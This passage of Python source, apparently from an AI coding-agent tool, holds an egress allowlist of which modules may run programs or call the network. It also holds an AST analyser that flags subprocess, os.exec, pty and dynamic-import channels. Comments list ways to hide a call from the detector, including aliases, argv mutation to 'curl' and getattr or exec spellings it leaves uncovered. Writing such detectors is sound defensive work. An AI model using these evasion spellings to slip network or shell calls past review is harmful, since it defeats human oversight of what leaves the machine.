            _ON + "same session as agent/claude_backend.py"),
        # NOT PREVIOUSLY DISCLOSED. Found only after this file learned to read
        # `import subprocess as _sp_fetch` and `asyncio.to_thread(_sp.run, …)`;
        # it is the #49 shape exactly — a module already allowlisted for `gh`
        # and `glab` growing a THIRD channel that nothing named.
        "exec:git fetch": Allowed(
            "your git remote — `git fetch origin` at :2395, refreshing remote "
            "refs so the agent does not work on stale branches",
            _ON + "runs on EVERY task attempt, before the coder starts; "
                  "best-effort, failure is swallowed at :2401"),
        # NOT PREVIOUSLY DISCLOSED, and unbounded.
        "exec:<dynamic>": Allowed(
            "whatever `task.config['env_setup']` and `['env_teardown']` "
            "contain — `_sp.run(cmd, shell=True)` at :2418 and :2520, a real "
            "shell with no allowlist",
            _ON + "runs whenever a task carries env_setup/env_teardown; the "
                  "content is the task author's, not ours"),
    },
    "core/web_build.py": {
        # `rebuild()` loops `for argv in _BUILD_ARGVS: run(argv, ...)` — the
        # analyzer sees argv bound by a loop, not a literal at the call site,
        # so it reports `<dynamic>` even though both argvs are the fixed,
        # hardcoded module-level tuple `(["npm", "--prefix", "web", "ci"],
        # ["npm", "--prefix", "web", "run", "build"])`. Nothing here reads
        # task/profile/user config into the argv.
        "exec:<dynamic>": Allowed(
            "the npm registry — `npm --prefix web ci` then "
            "`npm --prefix web run build`, resolving `web/package-lock.json` "
            "against the configured npm registry",
            _ON + "fires only on a SOURCE checkout (`web/src` beside "
                  "`web/dist`; a wheel/frozen install has no `web/src` and "
                  "is skipped entirely) whose `web/dist` is older than "
                  "`web/src` — and only when `NH_NO_AUTO_BUILD` is unset; "
                  "set it to fall back to a warning instead"),
    },
    "updates.py": {
        "http:urllib.request": Allowed(
            "https://pypi.org/pypi/no-human/json — no identifier, no repo name",
            _ON + "updates.enabled defaults to TRUE; off with "
                  "updates.enabled:false or NH_NO_UPDATE_CHECK=1"),
    },
    "telemetry.py": {
        "http:urllib.request": Allowed(
            "https://us.i.posthog.com/batch/ (telemetry.posthog_host), or "
            "telemetry.endpoint when set — anonymous uuid4 instance id, app "
            "version and allowlisted event names/props; never task, repo or "
            "prompt content",
            _ON + "telemetry.enabled defaults to TRUE; off with "
                  "telemetry.enabled:false in ~/.no_human/config.yaml"),
    },
    "testing/runner.py": {
        "exec:<dynamic>": Allowed(
            "whatever the repo's test command runs",
            _ON + "running the tests is the point of a task attempt"),
    },
    "testing/repro_gate.py": {
        "exec:<dynamic>": Allowed(
            "whatever the repo's test command / pytest runs",
            _ON + "the bugfix repro gate runs the repo's own tests"),
    },
    # This module used to hold a THIRD channel: `_probe_github_ambient` shelled
    # out to `gh auth status` — measured 1700-2036 ms, a network round-trip —
    # from `ambient_available("github")`, on a default install, when GitHub was
    # NOT configured. That was #49, and the reason this file keys on the CHANNEL
    # rather than the module. It was fixed on main in a68b825c, which replaced
    # the shell-out with `git credential fill` (:283). There is deliberately no
    # entry for that call: it resolves to `exec:git credential`, which
    # GIT_SUBCOMMANDS classifies LOCAL, and ALLOWLIST names only what can leave
    # the machine. test_no_stale_allowlist_entries is what forced the old line
    # out when the probe went — it failed naming exactly this entry.
    "integrations/__init__.py": {
        "http:httpx": Allowed(
            "Jira / Linear / CircleCI / your Teams webhook — health checks",
            _CFG + "integrations.jira.enabled, integrations.linear.enabled, "
                   "ci.enabled — nothing configured, "
                   "nothing sent"),
    },

    # -- Configuration-required: off in DEFAULT_CONFIG ---------------------
    # Every key below is asserted falsy by test_config_gates_are_really_off.
    # The four ci_gate modules are library code; they are reached only through
    # `ci_gate/gate.py`, whose `governs()` returns False at :165 unless
    # `enabled` AND `repos` AND `project_id` are all set, and whose only caller
    # is `blockers/wake.py:160`. `ci_gate.enabled` is the key named because it
    # is the one the operator turns on; the other two are additionally needed.
    "ci/circleci.py": {
        "http:httpx": Allowed("https://circleci.com/api/v2 with CIRCLECI_TOKEN",
                              _CFG + "ci.enabled"),
    },
    "ci/ghe_checkruns.py": {
        "exec:gh": Allowed("your GitHub/GHE host — check-run status, read only",
                           _CFG + "ci.enabled"),
    },
    "ci/gitlab.py": {
        "exec:glab": Allowed("your GitLab host — pipeline trigger and status; "
                             "sends the branch name and ci.variables",
                             _CFG + "ci.enabled"),
        "exec:<dynamic>": Allowed(
            "whatever the injected `_run_cmd` runs — `_subprocess_run` passes "
            "its argv straight through; the default path is the glab above",
            _CFG + "ci.enabled"),
    },
    "ci/jenkins.py": {
        "exec:curl": Allowed("ci.base_url — poll, or POST buildWithParameters",
                             _CFG + "ci.enabled"),
        "exec:<dynamic>": Allowed(
            "whatever the injected `_run_cmd` runs; the default path is the "
            "curl above", _CFG + "ci.enabled"),
    },
    "ci_gate/enrich.py": {
        "exec:curl": Allowed("the Jenkins job API named in the PR image "
                             "enrichment config", _CFG + "ci_gate.enabled"),
    },
    "ci_gate/gate.py": {
        "exec:kubectl": Allowed("your cluster's API server — namespace lookup",
                                _CFG + "ci_gate.enabled"),
    },
    "ci_gate/images.py": {
        "exec:kubectl": Allowed("your cluster's API server — pod image lookup",
                                _CFG + "ci_gate.enabled"),
    },
    "ci_gate/runner.py": {
        "exec:<dynamic>": Allowed(
            "your GitLab host — argv comes from `build_trigger_command`, which "
            "builds a `glab api --method POST …/pipeline`",
            _CFG + "ci_gate.enabled"),
    },
    "intake/jira.py": {
        "http:httpx": Allowed("your Jira site", _CFG + "integrations.jira.enabled"),
    },
    "intake/linear.py": {
        "http:httpx": Allowed("https://api.linear.app/graphql",
                              _CFG + "integrations.linear.enabled"),
    },
    "intake/monday.py": {
        "http:httpx": Allowed("https://api.monday.com/v2",
                              _CFG + "integrations.monday.enabled"),
    },
    "notify/slack.py": {
        "http:httpx": Allowed("the Slack webhook URL you set — a task-status line",
                              _CFG + "notifications.slack_webhook_url"),
    },
    "notify/teams.py": {
        "http:httpx": Allowed("the Teams webhook URL you set — a status card",
                              _CFG + "notifications.teams_webhook_url"),
    },
    "context/teams.py": {
        "http:httpx": Allowed(
            "https://graph.microsoft.com/v1.0/search/query — the task's "
            "external id or up to three keywords from its title",
            _CFG + "context.m365.token — absent from DEFAULT_CONFIG entirely; "
                   "the client raises before building the request"),
    },
    "brain/client.py": {
        "http:httpx": Allowed("team_brain.control_plane_url — task patterns",
                              _CFG + "team_brain.enabled, "
                                     "team_brain.control_plane_url"),
    },

    "testing/ui_evidence.py": {
        "exec:<dynamic>": Allowed(
            "two or three spawns, all loopback-only/worktree-local: "
            "`dev_server` spawns the profile's OWN `ui_evidence.start_cmd` "
            "in the attempt's worktree so the walk has something to walk "
            "(kills the process group afterwards) — and, when the profile "
            "also sets `ui_evidence.build_cmd`, runs that FIRST, in the "
            "same worktree, `shell=False`, one `subprocess.run` per "
            "`&&`-separated segment, with a hard timeout "
            "(`build_timeout_s`, default 300s) — a build failure/timeout "
            "never spawns `start_cmd` at all, it is a disclosed walk skip; "
            "`hermetic_backend` separately spawns an ISOLATED `nh start` "
            "(the existing command, no new CLI surface) under a throwaway "
            "`HOME`/`NO_HUMAN_HOME` on an ephemeral port, so a walk step "
            "that clicks Save/Reset-to-defaults can never write into the "
            "operator's real `~/.no_human/config.yaml` — torn down "
            "(killed, `HOME` rmtree'd) every time",
            _CFG + "ui_evidence.enabled — and, past that, `dev_server` only "
            "when the repo's own profile sets a `start_cmd` (absent from "
            "DEFAULT_CONFIG: it is a per-repo profile field, empty by "
            "default) and the manifest base_url is loopback; `build_cmd` "
            "only runs when set AND a server is genuinely about to be "
            "booted (nothing pre-existing at that base_url); "
            "`hermetic_backend` runs whenever the manifest has a base_url at "
            "all — it is the harness's own throwaway backend, not something "
            "a profile configures"),
        "http:urllib.request": Allowed(
            "the attempt's OWN dev server — one GET of base_url as a readiness "
            "probe before the browser walk (`_reachable`)",
            "loopback: `_base_url_problem` refuses any base_url whose host is "
            "not 127.0.0.1/localhost, the opener carries `ProxyHandler({})` so "
            "no proxy can reroute it, and `_NoRedirect` refuses every 3xx so a "
            "`Location:` header cannot send it anywhere else — exactly one "
            "connection, to base_url"),
        "sdk:playwright": Allowed(
            "whatever the attempt's OWN dev server serves — a headless browser "
            "is pointed only at 127.0.0.1/localhost (every `goto` with a scheme "
            "or netloc is refused at manifest validation), but a page it loads "
            "can reference fonts, scripts or beacons on any host, and the "
            "browser fetches those like any browser would",
            _CFG + "ui_evidence.enabled"),
        "sock:socket": Allowed(
            "nothing external — `_pick_ephemeral_port` binds "
            "`(\"127.0.0.1\", 0)`, reads back the OS-assigned port number, "
            "and immediately closes the socket; it exists only so "
            "`hermetic_backend` can hand its throwaway `nh start` a free "
            "loopback port instead of a fixed one",
            "loopback: the bind address is the literal string "
            "\"127.0.0.1\" — not configurable, not derived from a "
            "profile or base_url"),
    },
    "ci/jenkins_session.py": {
        "sdk:playwright": Allowed(
            "ci.base_url — drives a REAL BROWSER through the Jenkins SSO form "
            "login and stores the session cookie (:70-80)",
            _CFG + "ci.enabled"),
    },
    # The channel is `<dynamic>` because `doctor.walks_install_plan()` builds
    # argv at runtime (`uv sync --group e2e ...` or `pip install
    # playwright>=1.50`, then `playwright install chromium`) — PyPI, to
    # provision the optional visual-proof-walks dependency. Only reachable
    # from `nh doctor --fix-walks`, and only after that command's own
    # "Install now? [y/n]" consent prompt states the ~120MB size; `--dry-run`
    # prints the plan and returns before `install_walks` ever calls `runner`.
    "walks_provision.py": {
        "exec:<dynamic>": Allowed(
            "PyPI — installs the playwright package and downloads the "
            "chromium browser binary",
            "user-invoked: `nh doctor --fix-walks` only, after its consent "
            "prompt"),
    },
    "integrations/slack/worker.py": {
        "sdk:slack_sdk": Allowed(
            "Slack — a WebClient for the Web API plus a SocketModeClient, "
            "which holds an OUTBOUND WEBSOCKET open to Slack for as long as it "
            "runs. Not the same channel as the notify/slack.py webhook",
            _CFG + "integrations.slack.intake"),
    },

    # -- User-invoked: nothing happens until you type a command ------------
    "brain/cli.py": {
        "http:webbrowser": Allowed(
            "whatever host the sign-in URL points at — the user's own browser "
            "makes the request, not this process",
            "user-invoked: `nh brain login` only"),
    },
    "intake/github_issues.py": {
        "exec:gh": Allowed("your GitHub host — reads one issue",
                           "user-invoked: only for a ticket ref you hand it"),
    },
    "intake/gitlab_issues.py": {
        "exec:glab": Allowed("your GitLab host — reads one issue",
                             "user-invoked: only for a ticket ref you hand it"),
    },
    "cli/init_cmd.py": {
        "exec:<dynamic>": Allowed(
            "whichever binary is being probed — `[shutil.which(binary), flag]`. "
            "The list is fixed at `_PREREQUISITES` + `_OPTIONAL` (:45-54): "
            "python3, git, uv, claude, each with `--version`",
            "user-invoked: `nh init` prerequisite check only"),
    },

    # -- Developer tooling: the bench, not the installed run path ----------
    "eval/northstar.py": {
        "exec:git clone": Allowed(
            "the spec's repo URL — bench fixture setup",
            "user-invoked: `nh bench` only, never reached from `nh run`"),
        "exec:git push": Allowed(
            "a bare repo created INSIDE the bench sandbox; :240-245 resolves "
            "origin and raises BEFORE the push if it escapes workdir",
            "user-invoked: `nh bench` only, never reached from `nh run`"),
        "exec:<dynamic>": Allowed(
            "`[sys.executable, '-m', 'pytest', <holdout>]` — the spec's "
            "held-out tests",
            "user-invoked: `nh bench` only, never reached from `nh run`"),
    },
    # The nightly funnel eval. Same standing as the bench above: developer
    # tooling, never on the installed run path. `nh run` reaches neither.
    "eval/funnel_corpus.py": {
        "exec:git push": Allowed(
            "a bare repo created inside the run's OWN workdir — `materialize` "
            "inits it two lines earlier and pushes to that path and no other; "
            "the corpus fixtures have no remote of their own to inherit",
            "user-invoked: `python -m no_human.eval.funnel_eval` only"),
    },
    "eval/funnel_eval.py": {
        "exec:<dynamic>": Allowed(
            "`[sys.executable, '-m', 'pytest', <holdout>]` — the tier's "
            "held-out test, built by `funnel_corpus.load_corpus` from a path "
            "inside `eval/funnel_corpus/`",
            "user-invoked: `python -m no_human.eval.funnel_eval` only"),
    },
    "eval/replay.py": {
        "exec:git push": Allowed(
            "a bare repo created inside the replay sandbox (`str(bare)`)",
            "user-invoked: `nh eval replay` only"),
        "exec:<dynamic>": Allowed(
            "`[sys.executable, '-m', 'pytest', <holdout>]` — the golden's "
            "held-out tests", "user-invoked: `nh eval replay` only"),
    },
    # The channel is `<dynamic>` because argv[0] is `python or sys.executable`,
    # chosen at runtime. The program is `python -m pytest` run on a throwaway
    # probe file written INSIDE the bench sandbox (:88-98) — the `wrong_tree_imports`
    # pre-flight that checks, once per spec, whether the sandbox's own packages
    # import from the sandbox or leak to an editable install of the original tree.
    # It imports local packages and prints a path; it dials nothing.
    "eval/sandbox_selftest.py": {
        "exec:<dynamic>": Allowed(
            "nothing off this machine — `<python> -m pytest` on a probe file "
            "inside the sandbox, to see which top-level packages resolve OUTSIDE "
            "the sandbox tree",
            "user-invoked: the northstar bench pre-flight "
            "(`eval/northstar.py:600`), `nh bench` only"),
    },
}


# ---------------------------------------------------------------------------
# The analyser
# ---------------------------------------------------------------------------

_SUBPROCESS_ATTRS = frozenset({
    "run", "Popen", "call", "check_call", "check_output",
    "getoutput", "getstatusoutput",
})
#: Every `os` entry point that replaces or spawns a process. `system`/`popen`
#: alone was a hole: `os.execvp`, `os.spawnvp` and `os.posix_spawn` run a
#: program just as well and were invisible.
_OS_EXEC_ATTRS = frozenset({
    "system", "popen", "execv", "execve", "execvp", "execvpe", "execl",
    "execle", "execlp", "execlpe", "spawnv", "spawnve", "spawnvp", "spawnvpe",
    "spawnl", "spawnle", "spawnlp", "spawnlpe", "posix_spawn", "posix_spawnp",
})
_ASYNCIO_EXEC_ATTRS = frozenset({"create_subprocess_exec", "create_subprocess_shell"})
_ASYNCIO_NET_ATTRS = frozenset({"open_connection", "start_server"})

#: A dynamic import is an import that `visit_Import` cannot see: the module name
#: is an ARGUMENT, so it never appears in an `import` statement. Both spellings
#: below bind a module object exactly as `import x` does.
#:
#: These are charged AT THE CALL, not through attribute tracking, because the
#: binding is opaque: `m = importlib.import_module("socket")` gives `m` no
#: syntactic tie to `socket`, so the INERT_ATTRS carve-out that makes a plain
#: `import socket` wait for `socket.socket` cannot apply. Charging on sight is
#: the fail-closed reading, and it is why `socket.gaierror` reached this way
#: WOULD be reported where the static spelling is not. That asymmetry is
#: deliberate: nothing in this repo needs the dynamic form for an inert
#: attribute, and the alternative is a channel that goes quiet on an alias.
#:
#: NOT covered, and left uncovered on purpose rather than half-covered:
#: `getattr(importlib, "import_module")("socket")`, `importlib.__dict__[...]`,
#: a rebound `f = importlib.import_module; f("socket")`, and `exec("import
#: socket")`. Each needs value tracking through a different mechanism; this
#: entry claims the two direct spellings and says so.
_DYNAMIC_IMPORT_ATTRS: dict[str, frozenset[str]] = {
    "importlib": frozenset({"import_module"}),
}
_DYNAMIC_IMPORT_BUILTIN = "__import__"
_PTY_EXEC_ATTRS = frozenset({"spawn", "fork"})

#: module -> the attributes of it that run a program.
EXEC_ATTRS: dict[str, frozenset[str]] = {
    "subprocess": _SUBPROCESS_ATTRS,
    "os": _OS_EXEC_ATTRS,
    "asyncio": _ASYNCIO_EXEC_ATTRS,
    "pty": _PTY_EXEC_ATTRS,
}
#: Keywords that carry argv when it is not passed positionally.
_ARGV_KEYWORDS = frozenset({"args", "argv", "cmd", "command"})
#: Mutations that can change argv[0] — the PROGRAM. A name bound to
#: `["git","status"]` and then `cmd[0] = "curl"` is not `git status` any more,
#: and reading it as such is a false NEGATIVE, the worst kind this file makes.
_HEAD_MUTATORS = frozenset({"insert", "remove", "pop", "clear", "sort", "reverse"})
#: Mutations that can only ever add to the TAIL. `cmd = ["gh","api"]` followed
#: by `cmd += [...]` is still `gh` — treating it as unknown would have cost
#: `ci/ghe_checkruns.py` its name and replaced a reviewable "gh" line with an
#: unreviewable "some program" one. The program survives; the SUBCOMMAND does
#: not, which is why a mutated `git` list still resolves to `git <dynamic>`.
_TAIL_MUTATORS = frozenset({"append", "extend"})

#: A program name, as opposed to a data string that happens to head a list.
_PROGRAM_RE = re.compile(r"^[A-Za-z][A-Za-z0-9_.+-]*$")
#: git's own options that consume the NEXT word. Without this, the very common
#: `["git", "-C", str(repo), "log", ...]` reads as "subcommand unknown" —
#: because `str(repo)` is not a constant — and four modules that only ever run
#: local git get charged with egress. Four false positives is how a guard dies.
_GIT_OPTS_WITH_VALUE = frozenset({
    "-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path",
    "--config-env",
})

#: argv that could not be resolved to a constant program. Fails closed.
DYNAMIC = "<dynamic>"


def _const_str(node: ast.AST) -> str | None:
    return node.value if isinstance(node, ast.Constant) and isinstance(node.value, str) else None


class _Analyser(ast.NodeVisitor):
    """Collect the egress-capability channels of one module.

    Three passes. The first two find the things a single call site cannot show:

    * **module aliases.** `import subprocess as _sp` was the two-word
      refutation of the first version of this file: `_call_kind` matched
      `f.value.id == "subprocess"` literally, so an alias made the whole
      detector silent — including on `core/orchestrator.py`, which fetches from
      your git remote on every task attempt behind `import subprocess as
      _sp_fetch`. Aliases are now resolved to the canonical module.
    * **exec sinks.** This repo overwhelmingly writes
      `def _run(argv): subprocess.run(argv, ...)` and then calls
      `_run(["gh", "auth", "status"])` — the argv literal and the `subprocess`
      call are in different functions, so a resolver that only reads the call
      site sees `<dynamic>` and never learns the word `gh`. That is the shape
      of the defect this guard exists for.
    """

    def __init__(self) -> None:
        self.channels: dict[str, list[int]] = {}
        self._mod_aliases: dict[str, str] = {}   # bound name -> canonical module
        self._exec_refs: dict[str, str] = {}     # bound name -> canonical module
        self._import_refs: set[str] = set()      # `from importlib import import_module`
        self._net_aliases: dict[str, str] = {}   # bound name -> NET_IMPORTS key
        self._exec_aliases: set[str] = set()     # `run = _injected or subprocess.run`
        self._sinks: dict[str, set[tuple[int, str]]] = {}   # name -> {(pos, param)}
        self._sink_lines: dict[str, int] = {}
        self._sinks_called: set[str] = set()
        # `def _git(*a): subprocess.run(["git", "-C", p, *a])` — program known,
        # subcommand supplied by the caller.
        self._sub_sinks: dict[str, tuple[list[str | None], int, str]] = {}
        self._sub_sink_lines: dict[str, int] = {}
        self._sub_sinks_called: set[str] = set()
        self._skip_exec: set[int] = set()   # id() of exec calls owned by a sub-sink
        self._consumed: set[int] = set()    # id() of nodes already accounted for
        self._absorbed: set[int] = set()    # exec refs already tracked as aliases
        self._callee_nodes: set[int] = set()
        # Name -> assigned expression, one dict per lexical scope. A PARAMETER
        # is seeded as _PARAM so it shadows an outer binding: without scoping,
        # `def _run(cmd): subprocess.run(cmd)` resolved `cmd` through an
        # unrelated `cmd = [...]` elsewhere in the file and reported whatever
        # that other function happened to run.
        self._scopes: list[dict[str, ast.AST | str | None]] = [{}]
        self._head_mutated: set[str] = set()
        self._tail_mutated: set[str] = set()

    _PARAM = "<param>"

    # -- recording ---------------------------------------------------------
    def _add(self, channel: str, lineno: int) -> None:
        self.channels.setdefault(channel, []).append(lineno)

    # -- imports -----------------------------------------------------------
    def visit_Import(self, node: ast.Import) -> None:
        for alias in node.names:
            bound = alias.asname or alias.name.split(".")[0]
            root = alias.name.split(".")[0]
            self._mod_aliases[bound] = alias.name if alias.asname else root
            channel = classify_import(alias.name)
            if channel is None:
                continue
            key = self._net_key(alias.name)
            if alias.asname:
                self._net_aliases[alias.asname] = key
            elif "." not in alias.name:
                self._net_aliases[root] = key
            # `import urllib.request` binds the name `urllib`, and `urllib.parse`
            # binds it too — so the root must NOT be registered for a dotted
            # import, or every `urllib.parse.quote` reads as a request. The
            # dotted form is matched in visit_Attribute instead.
            if key not in INERT_ATTRS:
                self._add(channel, node.lineno)   # no inert way to import it

    def visit_ImportFrom(self, node: ast.ImportFrom) -> None:
        if node.level:
            return                                    # relative: first party
        module = node.module or ""
        for alias in node.names:
            dotted = f"{module}.{alias.name}"
            channel = classify_import(dotted)
            if channel is not None and self._net_key(dotted) not in INERT_ATTRS:
                self._add(channel, node.lineno)       # e.g. `from urllib import request`
        channel = classify_import(module)
        if channel is not None:
            key = self._net_key(module)
            inert = INERT_ATTRS.get(key)
            if inert is None:
                self._add(channel, node.lineno)
            elif any(a.name not in inert for a in node.names):
                self._add(channel, node.lineno)
        # `from subprocess import run` / `from os import system` / `from pty
        # import spawn` all bind a bare name that runs a program.
        for exec_module, attrs in EXEC_ATTRS.items():
            if module == exec_module:
                for alias in node.names:
                    if alias.name in attrs:
                        self._exec_refs[alias.asname or alias.name] = exec_module
        # `from importlib import import_module` binds a bare name that imports.
        for alias in node.names:
            if alias.name in _DYNAMIC_IMPORT_ATTRS.get(module, frozenset()):
                self._import_refs.add(alias.asname or alias.name)

    @staticmethod
    def _net_key(dotted: str) -> str:
        parts = dotted.split(".")
        for depth in range(len(parts), 0, -1):
            prefix = ".".join(parts[:depth])
            if prefix in NET_IMPORTS:
                return prefix
        return dotted

    # -- scopes and assignments --------------------------------------------
    def _enter(self, node: ast.FunctionDef | ast.AsyncFunctionDef) -> None:
        scope: dict[str, ast.AST | str | None] = {}
        for arg in node.args.posonlyargs + node.args.args + node.args.kwonlyargs:
            scope[arg.arg] = self._PARAM
        for extra in (node.args.vararg, node.args.kwarg):
            if extra is not None:
                scope[extra.arg] = self._PARAM
        self._scopes.append(scope)

    def visit_FunctionDef(self, node: ast.FunctionDef) -> None:
        self._enter(node)
        self.generic_visit(node)
        self._scopes.pop()

    visit_AsyncFunctionDef = visit_FunctionDef  # type: ignore[assignment]

    def _lookup(self, name: str) -> ast.AST | str | None:
        """The bound expression, `_PARAM`, or None for 'never seen bound'."""
        for scope in reversed(self._scopes):
            if name in scope:
                return scope[name]
        return None

    def visit_Assign(self, node: ast.Assign) -> None:
        for target in node.targets:
            if isinstance(target, ast.Name):
                self._scopes[-1][target.id] = node.value
                # `sp = subprocess` — rebinding the module itself.
                if isinstance(node.value, ast.Name) and node.value.id in self._mod_aliases:
                    self._mod_aliases[target.id] = self._mod_aliases[node.value.id]
                if isinstance(node.value, ast.Name) and node.value.id in self._net_aliases:
                    self._net_aliases[target.id] = self._net_aliases[node.value.id]
            elif isinstance(target, ast.Subscript) and isinstance(target.value, ast.Name):
                self._head_mutated.add(target.value.id)   # `cmd[0] = "curl"`
            elif isinstance(target, ast.Tuple):
                for elt in target.elts:
                    if isinstance(elt, ast.Name):
                        self._scopes[-1][elt.id] = None   # unpack: bound, unknown
        self.generic_visit(node)

    def visit_AugAssign(self, node: ast.AugAssign) -> None:
        if isinstance(node.target, ast.Name):
            self._tail_mutated.add(node.target.id)   # `cmd += [...]`
        self.generic_visit(node)

    def visit_NamedExpr(self, node: ast.NamedExpr) -> None:
        if isinstance(node.target, ast.Name):
            self._scopes[-1][node.target.id] = node.value     # walrus
        self.generic_visit(node)

    # -- calls -------------------------------------------------------------
    def visit_Call(self, node: ast.Call) -> None:
        self._callee_nodes.add(id(node.func))
        f = node.func
        if isinstance(f, ast.Attribute) and isinstance(f.value, ast.Name):
            if f.attr in _HEAD_MUTATORS:
                self._head_mutated.add(f.value.id)
            elif f.attr in _TAIL_MUTATORS:
                self._tail_mutated.add(f.value.id)
        imported = self._dynamic_import_name(node)
        if imported is not None:
            # An import spelled as a call. `import:<dynamic>` is not an `exec:`
            # channel, so reach_of() reads it as EXTERNAL without a table entry
            # — a module chosen at runtime cannot be classified, and must not
            # be silent. A named module goes through the same classifier as a
            # static import, so an inert one (`__import__("time")`, live in
            # cli/commands.py) stays silent exactly as `import time` does.
            if imported == DYNAMIC:
                channel = f"import:{DYNAMIC}"
            elif imported in EXEC_ATTRS:
                # `__import__("subprocess").run(["curl", …])`. classify_import
                # calls subprocess INERT and is right to: a static `import
                # subprocess` is charged by the argv of what it RUNS, not by
                # the import. That machinery follows a bound name, and this
                # binding has none — so the import classifier says nothing and
                # the exec classifier never sees it. Charging the program as
                # unnameable is what stops the pair going quiet together; the
                # argv is legible here, but reading it through an opaque
                # binding is value tracking this guard does not do, and a
                # channel that says "cannot name it" is the honest report.
                channel = f"exec:{DYNAMIC}"
            else:
                channel = classify_import(imported)
            if channel is not None:
                self._add(channel, node.lineno)
        kind = self._call_kind(node)
        if kind == "exec-varargs":
            # asyncio.create_subprocess_exec("git", "merge-base", HEAD, ref):
            # argv is spread over the positional parameters, not a list.
            if id(node) in self._skip_exec:
                pass
            elif len(node.args) == 1 and isinstance(node.args[0], ast.Starred):
                self._resolve_argv(node.args[0], node.lineno)   # exec(*cmd)
            else:
                self._add(self._channel_for_argv(node.args), node.lineno)
        elif kind == "exec":
            if id(node) not in self._skip_exec:
                self._resolve_argv(self._argv_arg(node), node.lineno)
        elif kind == "asyncio-net":
            self._add("sock:asyncio", node.lineno)
        else:
            name = self._callee_name(node) or ""
            for pos, param in self._sinks.get(name, ()):
                self._sinks_called.add(name)
                self._resolve_argv(self._positional_or_keyword(node, pos, param),
                                   node.lineno)
            if name in self._sub_sinks:
                prefix, pos, _param = self._sub_sinks[name]
                self._sub_sinks_called.add(name)
                self._add(self._channel_for_argv(node.args[pos:], prefix), node.lineno)
            # `asyncio.to_thread(subprocess.run, argv, ...)`,
            # `executor.submit(subprocess.run, argv)`,
            # `functools.partial(subprocess.run, ...)`: the exec callable is an
            # ARGUMENT, never the callee. `core/orchestrator.py:2395` fetches
            # from your git remote exactly like this, and both halves of it —
            # the alias and this shape — were invisible.
            for index, arg in enumerate(node.args):
                if self._exec_module_of(arg) is None:
                    continue
                self._consumed.add(id(arg))
                nxt = node.args[index + 1] if index + 1 < len(node.args) else None
                if nxt is None:
                    self._add(f"exec:{DYNAMIC}", node.lineno)
                else:
                    self._resolve_argv(nxt, node.lineno)
        self.generic_visit(node)

    @staticmethod
    def _positional_or_keyword(node: ast.Call, pos: int, param: str) -> ast.AST | None:
        if len(node.args) > pos:
            return node.args[pos]
        for kw in node.keywords:
            if kw.arg == param:
                return kw.value
        return None

    @staticmethod
    def _argv_arg(node: ast.Call) -> ast.AST | None:
        if node.args:
            return node.args[0]
        for kw in node.keywords:                       # subprocess.run(args=[...])
            if kw.arg in _ARGV_KEYWORDS:
                return kw.value
        return None

    @staticmethod
    def _callee_name(node: ast.Call) -> str | None:
        f = node.func
        if isinstance(f, ast.Attribute):
            return f.attr
        return f.id if isinstance(f, ast.Name) else None

    def _dynamic_import_name(self, node: ast.Call) -> str | None:
        """The module a dynamic import names, DYNAMIC if it is built at runtime,
        or None if *node* is not a dynamic import.

        Resolves `importlib.import_module`, `il.import_module` (aliased import)
        and a bare `import_module` imported `from importlib`, plus the
        `__import__` builtin. The alias arm is not hypothetical: `import
        subprocess as _sp` is what refuted the first version of this guard, and
        an alias would evade this one the same way.
        """
        f = node.func
        if isinstance(f, ast.Name):
            dynamic = f.id == _DYNAMIC_IMPORT_BUILTIN or f.id in self._import_refs
        elif isinstance(f, ast.Attribute) and isinstance(f.value, ast.Name):
            module = self._mod_aliases.get(f.value.id)
            dynamic = f.attr in _DYNAMIC_IMPORT_ATTRS.get(module or "", frozenset())
        else:
            dynamic = False
        if not dynamic:
            return None
        if not node.args:
            return DYNAMIC
        return _const_str(node.args[0]) or DYNAMIC

    def _exec_module_of(self, node: ast.AST) -> str | None:
        """The module whose exec entry point *node* refers to, or None.

        Resolves `subprocess.run`, `_sp.run` (aliased import), `sp.run` (module
        rebound to a name) and a bare `run` imported `from subprocess`.
        """
        if isinstance(node, ast.Attribute) and isinstance(node.value, ast.Name):
            module = self._mod_aliases.get(node.value.id)
            if module and node.attr in EXEC_ATTRS.get(module, frozenset()):
                return module
            return None
        if isinstance(node, ast.Name):
            return self._exec_refs.get(node.id)
        return None

    def _call_kind(self, node: ast.Call) -> str | None:
        f = node.func
        module = self._exec_module_of(f)
        if module == "asyncio" and isinstance(f, ast.Attribute):
            return "exec-varargs" if f.attr == "create_subprocess_exec" else "exec"
        if module is not None:
            return "exec"
        if isinstance(f, ast.Attribute) and isinstance(f.value, ast.Name):
            if (self._mod_aliases.get(f.value.id) == "asyncio"
                    and f.attr in _ASYNCIO_NET_ATTRS):
                return "asyncio-net"
        if isinstance(f, ast.Name) and f.id in self._exec_aliases:
            return "exec"
        return None

    # -- bare references ---------------------------------------------------
    def visit_Attribute(self, node: ast.Attribute) -> None:
        # `httpx.post` / `urllib.request.urlopen`
        target = node.value
        key = None
        if isinstance(target, ast.Name):
            key = self._net_aliases.get(target.id)
            self._consumed.add(id(target))
        elif isinstance(target, ast.Attribute) and isinstance(target.value, ast.Name):
            dotted = f"{target.value.id}.{target.attr}"
            key = self._net_aliases.get(dotted) or (dotted if dotted in NET_IMPORTS else None)
            self._consumed.add(id(target))
        channel = NET_IMPORTS.get(key) if key else None
        if channel and node.attr not in INERT_ATTRS.get(key or "", frozenset()):
            self._add(channel, node.lineno)
        # An exec callable named but not called — a `Popen` subclass base, a
        # dict value, a bare reference. It cannot be followed, so it is
        # <dynamic>: unknown, and therefore refused.
        if (self._exec_module_of(node) is not None
                and id(node) not in self._callee_nodes
                and id(node) not in self._consumed
                and id(node) not in self._absorbed):
            self._add(f"exec:{DYNAMIC}", node.lineno)
        self.generic_visit(node)

    def visit_Name(self, node: ast.Name) -> None:
        if id(node) in self._consumed or id(node) in self._callee_nodes:
            return
        # `getattr(httpx, "post")` — the module named, the attribute hidden.
        channel = NET_IMPORTS.get(self._net_aliases.get(node.id, ""))
        if channel is not None and isinstance(node.ctx, ast.Load):
            self._add(channel, node.lineno)
        if node.id in self._exec_refs:
            self._add(f"exec:{DYNAMIC}", node.lineno)

    # -- argv resolution ---------------------------------------------------
    def _resolve_argv(self, arg: ast.AST | None, lineno: int, *, depth: int = 0) -> None:
        """Turn an argv expression into channel(s). Unresolvable => DYNAMIC."""
        if arg is None or depth > 4:
            self._add(f"exec:{DYNAMIC}", lineno)
            return
        self._consumed.add(id(arg))
        if isinstance(arg, ast.Starred):          # create_subprocess_exec(*cmd)
            self._resolve_argv(arg.value, lineno, depth=depth + 1)
            return
        if isinstance(arg, ast.Name):
            if arg.id in self._head_mutated:
